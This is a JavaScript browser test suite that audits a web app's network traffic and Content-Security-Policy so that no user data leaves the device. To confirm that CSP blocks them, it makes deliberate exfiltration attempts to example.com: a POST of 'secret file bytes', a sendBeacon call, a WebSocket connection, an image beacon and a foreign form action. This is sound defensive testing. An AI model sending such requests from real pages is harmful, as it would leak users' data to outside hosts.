import { check, section } from "../helpers.mjs";

// Runs LAST: it audits every request the browser made during the whole run (page + Web Workers, via CDP auto-attach).
export async function privacy({ b, base }) {
  const origin = new URL(base).origin;

  await section("no upload: network audit of the whole run", async () => {
    const reqs = b.requests;
    const foreign = reqs.filter((r) => {
      try {
        const u = new URL(r.url);
        return !["blob:", "data:", "about:"].includes(u.protocol) && u.origin !== origin;
      } catch {
        return true;
      }
    });
    const nonGet = reqs.filter((r) => r.method !== "GET" && r.method !== "HEAD");
    const withBody = reqs.filter((r) => r.hasBody);
    const byType = {};
    for (const r of reqs) byType[r.type ?? "?"] = (byType[r.type ?? "?"] ?? 0) + 1;
    const workerReqs = reqs.filter((r) => r.session !== "page").length;
    console.log(`   ${reqs.length} requests (${workerReqs} from workers):`, JSON.stringify(byType));
    check("every request of the run went to our own origin (static assets + WASM only)", foreign.length === 0 && reqs.length > 50, foreign.slice(0, 3).map((r) => r.url).join(" | ") || `${reqs.length} requests`);
    check("every request was a plain GET: no POST/PUT/beacon, no request body", nonGet.length === 0 && withBody.length === 0, nonGet.concat(withBody).slice(0, 3).map((r) => `${r.method} ${r.url}`).join(" | "));
    check("requests from Web Workers were audited too (workers + the pdf.js worker)", workerReqs > 0, String(workerReqs));
    const xhrish = reqs.filter((r) => ["XHR", "Ping", "WebSocket", "EventSource", "Other"].includes(r.type) && !/\.(wasm|js|mjs|json|txt|bcmap|pfb|ttf|otf|png|svg|ico|webmanifest)(\?|$)/.test(r.url) && !/\/_next\/|\/vendor\/|\/icons\/|\/manifest/.test(r.url));
    check("no XHR / WebSocket / ping / beacon traffic other than static assets", xhrish.length === 0, xhrish.slice(0, 3).map((r) => `${r.type} ${r.url}`).join(" | "));
  });

  await section("no upload: the browser itself forbids it (CSP) on /app, in workers and vendor engines", async () => {
    await b.goto(`${base}/en/app`, 1500);
    for (const path of ["/en/app", "/ar/app"]) {
      const csp = await b.ev(`fetch(${JSON.stringify(path)}).then(r => r.headers.get('content-security-policy'))`);
      check(`${path}: CSP restricts connect/img/form to own origin (connect-src 'self' blob: data:)`, /connect-src 'self' blob: data:/.test(csp) && /default-src 'self'/.test(csp) && /form-action 'none'/.test(csp) && !/https?:\/\//.test(csp), String(csp).slice(0, 80));
    }
    const workerSrc = await b.ev(`(async () => {
      const w = [...performance.getEntriesByType('resource')].map(r => r.name).find((u) => /turbopack-worker|\\/chunks\\/.*\\.js/.test(u));
      return { u: w, csp: w ? (await fetch(w)).headers.get('content-security-policy') : null };
    })()`);
    check("Web Worker chunks are served with the same CSP (workers take their policy from their own response)", /connect-src 'self'/.test(workerSrc.csp ?? ""), JSON.stringify(workerSrc).slice(0, 120));
    for (const u of ["/vendor/pdfjs/pdf.worker.min.mjs"]) {
      const csp = await b.ev(`fetch(${JSON.stringify(u)}).then(r => r.headers.get('content-security-policy'))`);
      check(`${u} (engine worker) carries the CSP`, /connect-src 'self'/.test(csp ?? ""));
    }

    const errorsBefore = b.errors.length;
    const probe = await b.ev(`(async () => {
      const violations = [];
      document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
      const out = {};
      try { await fetch('https://example.com/upload', { method: 'POST', body: 'secret file bytes' }); out.fetch = 'sent'; } catch (e) { out.fetch = 'blocked'; }
      navigator.sendBeacon('https://example.com/b', 'x'); // returns true when merely queued; the CSP check happens when it is sent
      try { const ws = new WebSocket('wss://example.com/s'); out.ws = await new Promise((r) => { ws.onopen = () => r('open'); ws.onerror = () => r('blocked'); setTimeout(() => r('timeout'), 3000); }); } catch { out.ws = 'blocked'; }
      out.img = await new Promise((r) => { const i = new Image(); i.onload = () => r('loaded'); i.onerror = () => r('blocked'); i.src = 'https://example.com/p.png?leak=1'; setTimeout(() => r('timeout'), 3000); });
      const form = document.createElement('form'); form.action = 'https://example.com/post'; form.method = 'post'; document.body.appendChild(form);
      out.formAllowed = !!form.reportValidity; // submission is blocked by form-action 'none'; never actually submit in the test
      await new Promise((r) => setTimeout(r, 300));
      out.violations = violations;
      return out;
    })()`);
    check("CSP really blocks a POST of data to a foreign origin (fetch)", probe.fetch === "blocked", JSON.stringify(probe));
    check("CSP blocks navigator.sendBeacon (violation reported for the beacon URL)", probe.violations.some((v) => v === "connect-src https://example.com/b"), JSON.stringify(probe.violations));
    check("CSP blocks WebSocket and image-beacon exfiltration", probe.ws !== "open" && probe.img !== "loaded", JSON.stringify(probe));
    check("the browser reported connect-src / img-src violations for those attempts", probe.violations.some((v) => v.startsWith("connect-src")) && probe.violations.some((v) => v.startsWith("img-src")), JSON.stringify(probe.violations));
    // The deliberate probes above log CSP errors; they are expected, so remove them from the error list.
    b.errors.splice(errorsBefore).filter((e) => !/Content Security Policy|Refused to/.test(e)).forEach((e) => b.errors.push(e));
  });
}
